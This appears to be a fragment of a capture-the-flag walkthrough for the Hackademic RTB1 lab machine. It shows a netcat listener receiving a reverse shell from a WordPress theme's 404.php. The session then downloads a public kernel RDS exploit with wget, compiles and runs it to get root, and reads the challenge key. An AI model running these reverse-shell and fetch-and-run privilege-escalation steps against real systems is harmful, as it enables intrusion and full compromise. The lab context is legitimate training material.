+http://192.168.174.136/Hackademic_RTB1/wp-content/themes/starburst/404.php
+
+Listener
+root@kali:~# nc -nlvp 1234
+listening on [any] 1234 ...
+connect to [192.168.174.137] from (UNKNOWN) [192.168.174.136] 33110
+Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux
+ 15:51:10 up  4:47,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=48(apache) gid=489(apache) groups=489(apache)
+sh: no job control in this shell
+sh-4.0$ id
+id
+uid=48(apache) gid=489(apache) groups=489(apache)
+sh-4.0$ uname -a
+uname -a
+Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux
+sh-4.0$ python -c 'import pty; pty.spawn("/bin/sh")'
+python -c 'import pty; pty.spawn("/bin/sh")'
+sh-4.0$ cd /tmp
+cd /tmp
+sh-4.0$ wget http://downloads.securityfocus.com/vulnerabilities/exploits/44219.c
+--2016-01-28 15:56:57--  http://downloads.securityfocus.com/vulnerabilities/exploits/44219.c
+Resolving downloads.securityfocus.com... 143.127.139.111
+Connecting to downloads.securityfocus.com|143.127.139.111|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 6804 (6.6K) [text/plain]
+Saving to: `44219.c'
+
+100%[======================================>] 6,804       --.-K/s   in 0s      
+
+2016-01-28 15:56:58 (37.8 MB/s) - `44219.c' saved [6804/6804]
+
+sh-4.0$ ls
+ls
+44219.c  orbit-gdm  pulse-PKdhtXMmr18n
+sh-4.0$ gcc -o exploit 44219.c      
+gcc -o exploit 44219.c
+sh-4.0$ ./exploit
+./exploit
+[*] Linux kernel >= 2.6.30 RDS socket exploit
+[*] by Dan Rosenberg
+[*] Resolving kernel addresses...
+ [+] Resolved security_ops to 0xc0aa19ac
+ [+] Resolved default_security_ops to 0xc0955c6c
+ [+] Resolved cap_ptrace_traceme to 0xc055d9d7
+ [+] Resolved commit_creds to 0xc044e5f1
+ [+] Resolved prepare_kernel_cred to 0xc044e452
+[*] Overwriting security ops...
+[*] Overwriting function pointer...
+[*] Triggering payload...
+[*] Restoring function pointer...
+[*] Got root!
+sh-4.0# id
+id
+uid=0(root) gid=0(root)
+sh-4.0# 
+sh-4.0# cd /root
+cd /root
+sh-4.0# ls
+ls
+Desktop  anaconda-ks.cfg  key.txt  key.txt~
+sh-4.0# cat key.txt
+cat key.txt
+Yeah!!
+You must be proud because you 've got the password to complete the First *Realistic* Hackademic Challenge (Hackademic.RTB1) :)
+
+$_d&jgQ>>ak\#b"(Hx"o<la_%
+
+Regards,
+mr.pr0n || p0wnbox.Team || 2011
+http://p0wnbox.com
+
+sh-4.0# 
